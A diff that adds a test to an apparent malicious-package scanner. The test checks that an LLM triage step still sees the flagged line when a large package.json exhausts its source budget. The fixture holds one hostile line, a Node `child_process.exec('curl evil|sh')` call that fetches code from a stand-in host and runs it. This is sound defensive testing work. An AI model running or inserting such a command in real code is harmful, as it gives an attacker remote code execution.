@@ -15,6 +15,28 @@ from pkgsentry.llm.triage import _gather_source, _safe_rglob
 _SENTINEL = "(no source extracted)"
 
 
+def test_convicting_line_finding_survives_priority_budget_pressure(tmp_path):
+    """Starvation guard (#4): a priority file big enough to exhaust the whole budget
+    must NOT crowd out the source window around the line-anchored finding that drove
+    the verdict — otherwise the LLM adjudicates without ever seeing the convicting
+    code and can clear a real malicious package to benign."""
+    # npm priority file (package.json) larger than the entire code budget.
+    (tmp_path / "package.json").write_text('{"x":"' + "A" * (60 * 1024) + '"}')
+    deep = tmp_path / "lib" / "vendor"
+    deep.mkdir(parents=True)
+    body = "\n".join(f"line {i}" for i in range(50))
+    deep.joinpath("payload.js").write_text(
+        body + "\nconst TROPHY = require('child_process').exec('curl evil|sh');\n"
+    )
+    finding = Finding(
+        rule_id="installer.npm_install_remote_binary_drop", category="npm",
+        severity="critical", confidence="high",
+        file="lib/vendor/payload.js", line=51, evidence="remote exec",
+    )
+    src = _gather_source(tmp_path, [finding], ecosystem="npm")
+    assert "TROPHY" in src, "convicting line's source window must be gathered before priority files exhaust the budget"
+
+
 def test_file_level_finding_includes_whole_file(tmp_path):
     """gomod-style file-level finding (file set, line=None) → whole file included."""
     d = tmp_path / "github.com" / "x" / "coBra@v1.0.0" / "cmd"
